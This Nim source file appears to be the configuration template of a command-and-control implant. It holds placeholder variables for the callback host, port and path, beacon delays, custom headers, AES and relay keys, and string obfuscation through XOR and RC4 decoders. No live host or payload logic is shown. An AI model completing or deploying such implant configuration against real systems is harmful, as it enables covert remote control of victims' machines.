const obfuscationType* = "<obfuscationType>"

from crypt/xordec import fromXor
from crypt/rc4 import fromRC4
include "../macro"
import tables

var channel* = obf("<channel>")
var host* = obf("<host>")
var port* = obf("<port>")
var path* = obf("<path>")
var hostTag* = obf("<hostTag>")
var bodyContent* = initTable[string, string]()
var customCommunication* = obf("<customCommunication>")
var serverResponseTemplate* = obf("<serverResponseTemplate>")
var customCookies* = initTable[string, string]()
var customHeaders* = initTable[string, string]()
var beaconDelay* = 867530901
var secondDelay* = 867530904
var secondDelayEnabled* = 867530905
var relayTimeout* = 5 * 60 * 1000
var pipelineTarget* = obf("<pipelineTarget>")
var aesKey* = "<aesKey>"
var aesRelayKey* = "<aesRelayKey>"
var bgWorkers* = 0
var activeRelayPaths*: seq[string] = @[]
